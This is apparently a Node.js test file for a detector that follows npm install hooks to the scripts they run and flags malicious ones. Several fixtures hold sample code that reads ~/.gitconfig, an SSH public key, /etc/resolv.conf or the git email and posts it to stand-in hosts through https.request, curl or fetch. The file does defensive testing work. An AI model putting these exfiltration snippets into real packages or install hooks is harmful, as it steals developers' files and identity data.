import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-lifecycle-hook-followthrough.js';

test('TIER1-HOOK-FOLLOWTHROUGH: postinstall indirection to malicious script detected', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'node scripts/postinstall.js' },
  };
  const allFiles = [
    {
      path: 'scripts/postinstall.js',
      content: `const https = require('https'); const fs = require('fs'); const data = fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8'); https.request({ hostname: 'evil.run.app', path: '/x', method: 'POST' }, () => {}).end(data);`,
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert(findings.length > 0);
  assert.equal(findings[0].id, 'TIER1-HOOK-FOLLOWTHROUGH');
  assert.ok(findings[0].evidence.some((e) => e.includes('resolved_file')));
});

test('TIER1-HOOK-FOLLOWTHROUGH: sh indirection detected', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { preinstall: 'sh scripts/setup.sh' },
  };
  const allFiles = [
    {
      path: 'scripts/setup.sh',
      content: `#!/bin/bash\ncurl -s https://evil.vercel.app/collect -d "$(cat ~/.gitconfig)"\n`,
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert(findings.length > 0);
  assert.equal(findings[0].id, 'TIER1-HOOK-FOLLOWTHROUGH');
});

test('TIER1-HOOK-FOLLOWTHROUGH: bash indirection detected', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { install: 'bash build.sh' },
  };
  const allFiles = [
    {
      path: 'build.sh',
      content: `#!/bin/bash\nEMAIL=$(git config user.email)\ncurl -s -X POST https://telemetry.workers.dev/c -d "e=$EMAIL"\n`,
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert(findings.length > 0);
  assert.equal(findings[0].id, 'TIER1-HOOK-FOLLOWTHROUGH');
});

test('TIER1-HOOK-FOLLOWTHROUGH: 2-level chain indirection detected', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'node scripts/a.js' },
  };
  const allFiles = [
    {
      path: 'scripts/a.js',
      content: `const { execSync } = require('child_process'); execSync('node scripts/b.js');`,
    },
    {
      path: 'scripts/b.js',
      content: `const fs = require('fs'); const data = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa.pub', 'utf8'); fetch('https://exfil.netlify.app/upload', { method: 'POST', body: data });`,
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert(findings.length > 0);
  assert.ok(findings[0].evidence.some((e) => e.includes('chain_level_2')));
});

test('TIER1-HOOK-FOLLOWTHROUGH: inline eval hook returns no findings (not indirection)', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'eval "console.log(1)"' },
  };
  const findings = await scan(pkgJson, [], null, []);
  assert.equal(findings.length, 0);
});

test('TIER1-HOOK-FOLLOWTHROUGH: hook referencing non-existent file returns no findings', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'node scripts/missing.js' },
  };
  const allFiles = [{ path: 'index.js', content: 'console.log("hello");' }];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert.equal(findings.length, 0);
});

test('TIER1-HOOK-FOLLOWTHROUGH: hook referencing benign script returns no findings', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'node scripts/build.js' },
  };
  const allFiles = [
    { path: 'scripts/build.js', content: 'console.log("building..."); process.exit(0);' },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert.equal(findings.length, 0);
});

test('TIER1-HOOK-FOLLOWTHROUGH: no scripts returns no findings', async () => {
  const findings = await scan({ name: 'test-pkg' }, [], null, []);
  assert.equal(findings.length, 0);
});

test('TIER1-HOOK-FOLLOWTHROUGH: known reputable package returns no findings', async () => {
  const pkgJson = {
    name: 'react',
    scripts: { postinstall: 'node scripts/postinstall.js' },
  };
  const allFiles = [
    {
      path: 'scripts/postinstall.js',
      content: 'eval("malicious")',
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert.equal(findings.length, 0);
});

test('TIER1-HOOK-FOLLOWTHROUGH: PaaS domain in referenced file boosts score', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: { postinstall: 'node scripts/install.js' },
  };
  const allFiles = [
    {
      path: 'scripts/install.js',
      content: `const https = require('https'); const fs = require('fs'); const data = fs.readFileSync('/etc/resolv.conf', 'utf8'); https.request({ hostname: 'collector.web.app', path: '/x', method: 'POST' }, () => {}).end(data);`,
    },
  ];
  const findings = await scan(pkgJson, [], null, allFiles);
  assert(findings.length > 0);
  assert.ok(findings[0].evidence.some((e) => e.includes('paas_domain')));
});
